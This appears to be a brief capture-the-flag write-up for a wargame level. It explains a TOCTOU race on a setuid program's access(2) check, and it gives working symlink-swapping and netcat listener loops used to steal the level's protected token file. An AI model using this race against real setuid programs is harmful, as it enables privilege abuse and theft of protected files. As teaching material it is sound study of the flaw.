We can see that there's a file named token owned by the user flag10 and an executable owned by flag10 and the level10 is in the group to whom own the executable, and the most important the transfer of privileges process with the setuid

we can observe that the program use the access(2) that can be exploitable in the TOCTOU (time-of-check to time-of-use) exploit

Access is intended to check whether the real user who executed the setuid program would normally be allowed to write/read/exec the file (i.e., access checks the real userid rather than effective userid).


we will use the race condition culnirability to exploit this :

steps: 
	we will create a file in the tmp dir that will be named as bingo,
	
		touch /tmp/bingo

	we will create a link to the bingo file    named /tmp/s 
	we will create a link to the ~/token file  named /tmp/s

while true; do 
ln -sf /tmp/bingo /tmp/s;
ln -sf ~/token /tmp/s;
done

	in another window we listen to the 6969 port with nc -l 6969 

	and in other terminal we do this

	while true; do
	./level10 /tmp/s ip;
	done

and bingo the token appear;
